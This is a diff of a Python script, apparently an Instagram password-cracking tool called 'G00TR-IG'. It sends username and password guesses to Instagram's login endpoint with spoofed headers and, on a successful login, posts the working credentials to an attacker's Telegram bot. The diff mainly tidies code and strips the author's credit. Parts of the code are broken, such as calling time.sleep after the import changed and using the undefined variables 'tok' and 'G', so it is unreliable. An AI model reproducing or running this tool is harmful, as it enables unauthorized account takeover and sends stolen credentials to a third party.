@@ -1,8 +1,6 @@
-import requests
-import random
+import requests, random, pyfiglet
 from user_agent import generate_user_agent
-import pyfiglet
-import time
+from time import sleep
 
 #--------------------------------
 
@@ -20,10 +18,8 @@ White="\033[1;37m"       # White
 logo = pyfiglet.figlet_format("G00TR-IG")
 print(Blue+logo)
 
-
 ID = input("[+] - Enter Your ID : ")
 token = input("[+] - Enter Your Token BOT : ")
-
 
 r = requests.Session()
 
@@ -37,7 +33,6 @@ def check():
         time.sleep(5)
 
     url = 'https://www.instagram.com/accounts/login/ajax/'
-  
   
     headers = {'accept':'*/*',
          'accept-encoding':'gzip,deflate,br',
@@ -55,29 +50,19 @@ def check():
          'x-ig-app-id':'936619743392459',
          'x-ig-www-claim':'0',
          'x-instagram-ajax':'8a8118fa7d40',
-         'x-requested-with':'XMLHttpRequest'}
-         
+         'x-requested-with':'XMLHttpRequest'}         
          
     data = {'username':username,
          'enc_password':'#PWD_INSTAGRAM_BROWSER:0:1589682409:{}'.format(password),
          'queryParams':'{}',
          'optIntoOneTap':'false'}
 
-
     req_login = r.post(url,headers=headers, data=data, proxies=None)
 
     if "userid" in req_login.text:
-        print(Green+"User name : "+username)
-        print(Green+"Password : "+password)
+        print(Green+"User name : "+username, Green+"Password : "+password)
         tlg = requests.post(f'''https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text={G}''')
         i = requests.post(tlg)
 
-
     else:
         print(Red+"Error : =password")
-
-
-
-# This Tool Was Developed By : TLER AL-BISHI
-# IG : @tler.sa - Telegram : @tlerz
-# The Tool May Not Be Modified Without Permission !
